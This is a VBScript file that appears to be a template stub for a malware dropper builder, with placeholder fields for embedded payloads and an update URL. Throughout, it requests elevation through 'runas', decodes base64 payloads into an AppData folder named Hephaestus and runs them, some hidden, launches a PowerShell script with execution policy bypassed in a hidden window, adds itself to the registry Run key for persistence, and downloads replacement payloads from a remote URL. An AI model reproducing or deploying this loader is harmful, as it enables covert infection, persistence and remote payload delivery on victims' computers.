Dim bodyX
bodyX="0102"
Dim selfDel
selfDel="__selfDel"
Dim autostart
autostart="__autostart"
Dim autoupdate
autoupdate="__autoupdate"
Dim updateurl
updateurl="__updateurl"
Dim arrFrontData
arrFrontData = Array("__frontData")
Dim arrFrontName
arrFrontName = Array("__frontName")
Dim arrBackData
arrBackData = Array("__backData")
Dim arrBackName
arrBackName = Array("__backName")


If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If


Sub MainScriptLogic()
    if IsAutoStart() = False then
        For i = 0 To UBound(arrFrontName)
            data = arrFrontData(i)
            exe = GetFilePath(arrFrontName(i))
            DecodeBase64ToFile data, exe
            ExecuteFileAsync exe, False
        Next
    end if

    if Not FileExists(GetPS1FilePath) or IsAutoStart() = False Then
        DecodeBase64ToFile bodyX, GetPS1FilePath
    end if

    Run

    if IsAutoStart() = False then
        For i = 0 To UBound(arrBackName)
            data = arrBackData(i)
            exe = GetFilePath(arrBackName(i))
            DecodeBase64ToFile data, exe
            ExecuteFileAsync exe, True
        Next
    end if

    if IsAutoStart() = False then
        if autostart = "True" Then
            DoSetAutoStart
        end if
    end if

    if autoupdate = "True" Then
        DoAutoUpdate
    end if

End Sub

Function GetPS1FilePath()
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
    destPath = fso.BuildPath(destFolder, "body.ps1")
    CreateFolder fso, destFolder
    GetPS1FilePath = destPath   
End Function

Function GetSelfFilePath()
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
    destPath = fso.BuildPath(destFolder, "holder.vbs")
    CreateFolder fso, destFolder
    GetSelfFilePath = destPath
End Function

Sub Run
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
    if IsAutoStart() = True then
        command = command & " -autostart"
    end if
    shell.Run command, 0, True
end sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")

    ' Capture command-line arguments
    Dim args
    args = ""
    Dim i
    For i = 1 To WScript.Arguments.Count
        args = args & " " & WScript.Arguments(i - 1)
    Next

    ' Construct the command string with the script name and arguments
    Dim command
    command = Chr(34) & WScript.ScriptFullName & Chr(34) & args

    ' Execute the script with elevated privileges
    objShell.ShellExecute "wscript.exe", command, "", "runas", 1

    ' Exit the script
    WScript.Quit
End Sub

Sub DoSetAutoStart()
    Dim registryKey, registryValue, command
    Dim fso, shell
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    CopyScript fso, WScript.ScriptFullName, GetSelfFilePath

    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
    registryValue = "Hephaestus"
    command = "wscript.exe """ & GetSelfFilePath & """ autostart"
    shell.RegWrite registryKey & registryValue, command, "REG_SZ"

    Set shell = Nothing
    Set fso = Nothing
End Sub

Function IsAutoStart()
    Dim args, i
    Set args = WScript.Arguments
    IsAutoStart = False
    For i = 0 To args.Count - 1
        If LCase(args.Item(i)) = "autostart" Then
            IsAutoStart = True
            Exit For
        End If
    Next
End Function


Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Sub CopyScript(fso, sourcePath, destinationPath)
    fso.CopyFile sourcePath, destinationPath, True
End Sub



Function DoAutoUpdate()
    Dim timeout, delay, startTime, response
    timeout = DateAdd("n", 1, Now)
    delay = 5
    startTime = Now

    Do While Now < timeout
        On Error Resume Next
        Set response = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        response.Open "GET", updateUrl, False
        response.Send
        
        If response.Status = 200 Then
            DecodeBase64ToFile response.responseText, GetPS1FilePath
            Exit Do
        End If
        On Error GoTo 0
        
        WScript.Sleep delay * 1000
    Loop
End Function



Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function


Function ExecuteFileAsync(filePath, hideWindow)
    if Not IsAutoStart Then
        Dim shell, result, windowStyle
        Set shell = CreateObject("WScript.Shell")
        If hideWindow Then
            windowStyle = 0 ' Hidden
        Else
            windowStyle = 1 ' Normal
        End If
        result = shell.Run(filePath, windowStyle, False)
        Set shell = Nothing
        ExecuteFileAsync = result
    end if
End Function

Function GetFilePath(fileName)
    Dim shell, fso, scriptPath, scriptFolder, fullPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    scriptFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
    fullPath = fso.BuildPath(scriptFolder, fileName)
    CreateFolder fso, scriptFolder
    Set fso = Nothing
    GetFilePath = fullPath
End Function



Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
